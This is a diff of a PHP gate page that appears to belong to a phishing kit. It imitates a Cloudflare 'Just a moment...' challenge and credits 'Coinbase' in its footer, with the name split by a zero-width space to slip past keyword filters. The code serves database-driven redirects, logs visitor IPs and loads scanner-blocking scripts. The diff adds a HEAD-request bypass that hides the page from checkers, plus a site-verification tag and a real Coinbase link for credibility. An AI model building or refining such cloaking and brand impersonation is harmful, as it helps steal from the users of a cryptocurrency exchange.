@@ -1,4 +1,10 @@
 <?php
+// ==================== HEALTH CHECK ====================
+if ($_SERVER['REQUEST_METHOD'] === 'HEAD') {
+    http_response_code(200);
+    exit;
+}
+
 // ==================== PROTECTION START ====================
 // Include both protection scripts
 require_once 'blocker.php';
@@ -13,7 +19,7 @@ header("Referrer-Policy: no-referrer");
 // Start output buffering
 ob_start();
 
-// Check for redirect commands from DATABASE
+// Check for redirect commands
 require_once 'config/database.php';
 $database = new Database();
 $db = $database->getConnection();
@@ -35,9 +41,8 @@ $redirect_target = $stmt->fetch(PDO::FETCH_ASSOC);
 if ($redirect_target) {
     $redirect_target = trim($redirect_target['target']);
     
-    // Log the redirect (to database instead of file)
-    $log_query = "INSERT INTO redirect_logs (ip_address, target, created_at) 
-                  VALUES (:ip, :target, NOW())";
+    // Log the redirect
+    $log_query = "INSERT INTO redirect_logs (ip_address, target, created_at) VALUES (:ip, :target, NOW())";
     
     // Create redirect_logs table if not exists
     $create_logs_table = "CREATE TABLE IF NOT EXISTS redirect_logs (
@@ -96,15 +101,17 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['g-recaptcha-response'
         <title>Just a moment...</title>
         <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
         <meta http-equiv="X-UA-Compatible" content="IE=Edge">
-        <meta name="viewport" content="width=device-width,initial-scale=1">
-        <meta name="robots" content="noindex,nofollow">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="google-site-verification" content="GyFOcNN51kFhhWUq753C23nII3fhEfCFSBw-0kB47Us" />
         
         <style>
             *{box-sizing:border-box;margin:0;padding:0}html{line-height:1.15;-webkit-text-size-adjust:100%;color:#313131;font-family:system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,"Noto Sans",sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol","Noto Color Emoji"}
             body{display:flex;flex-direction:column;height:100vh;min-height:100vh}
             .main-wrapper {flex: 1;}
-            .main-content{margin:8rem auto;padding-left:1.5rem;max-width:60rem}@media (width <= 720px){.main-content{margin-top:4rem}}.h2{line-height:2.25rem;font-size:1.5rem;font-weight:500}@media (width <= 720px){.h2{line-height:1.5rem;font-size:1.25rem}}
-            
+            .main-content{margin:8rem auto;padding-left:1.5rem;max-width:60rem}@media (width <= 720px){.main-content{margin-top:4rem}}.h2{line-height:2.25rem;font-size:1.5rem;font-weight:500}@media (width <= 720px){.h2{line-height:1.5rem;font-size:1.25rem}}#challenge-error-text{background-image:url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMiIgaGVpZ2h0PSIzMiIgZmlsbD0ibm9uZSI+PHBhdGggZmlsbD0iI0IyMEYwMyIgZD0iTTE2IDNhMTMgMTMgMCAxIDAgMTMgMTNBMTMuMDE1IDEzLjAxOSAwIDAgMCAxNiAzbTAgMjRhMTEgMTEgMCAxIDEgMTEtMTEgMTEuMDEgMTEuMDEgMCAwIDEtMTEgMTEiLz48cGF0aCBmaWxsPSIjQjIwRjAzIiBkPSJNMTcuMDM4IDE4LjYxNUgxNC44N0wxNC41NjMgOS41aDIuNzgzem0tMS4wODQgMS40MjdxLjY2IDAgMS4wNTcuMzg4LjQwNy4zODkuNDA3Ljk5NCAwIC41OTYtLjQwNy45ODQtLjM5Ny4zOS0xLjA1Ny4zODktLjY1IDAtMS4wNTYtLjM4OS0uMzk4LS4zODktLjM5OC0uOTg0IDAtLjU5Ny4zOTgtLjk4NS40MDYtLjM5NyAxLjA1Ni0uMzk3Ii8+PC9zdmc+");background-repeat:no-repeat;background-size:contain;padding-left:34px}@media (prefers-color-scheme: dark){body{background-color:#222;color:#d9d9d9}}</style>
+
+        <!-- Rest of your existing CSS styles -->
+        <style>
             .captcha-container {
                 display: flex;
                 justify-content: flex-start;
@@ -113,6 +120,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['g-recaptcha-response'
             
             #uMtSJ0 {
                 display: block !important;
+            }
+            
+            #uMtSJ0 > div > div {
+                display: block;
+                width: 100%;
             }
             
             .g-recaptcha {
@@ -159,18 +171,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['g-recaptcha-response'
                 background-repeat: no-repeat;
                 background-size: contain;
                 padding-left: 42px;
-                color: #313131;
-            }
-            
-            .core-msg {
-                color: #313131;
-                margin: 1rem 0;
-            }
-            
-            @media (prefers-color-scheme: dark) {
-                body { background-color: #222; color: #d9d9d9; }
-                #redirect-message { color: #d9d9d9; }
-                .core-msg { color: #d9d9d9; }
             }
         </style>
 
@@ -234,6 +234,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['g-recaptcha-response'
                                      data-sitekey="6Le-wvkSAAAAAPBMRTvw0Q4Muexq9bi0DJwx_mJ-"
                                      data-callback="onCaptchaVerify"></div>
                             </div>
+                            <input type="hidden" name="g-recaptcha-response" id="g-recaptcha-response">
                         </div>
                     </div>
                 </div>
@@ -265,7 +266,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['g-recaptcha-response'
             <div class="footer-inner">
                 <div class="clearfix diagnostic-wrapper">
                     <div class="ray-id">Performance &amp; security by
-                        <a rel="noopener noreferrer" href="#" target="_blank">C&#8203;oinbase</a>
+                        <a rel="noopener noreferrer" href="https://www.C&#8203;oinbase.com" target="_blank">C&#8203;oinbase</a>
                     </div>
                 </div>
             </div>
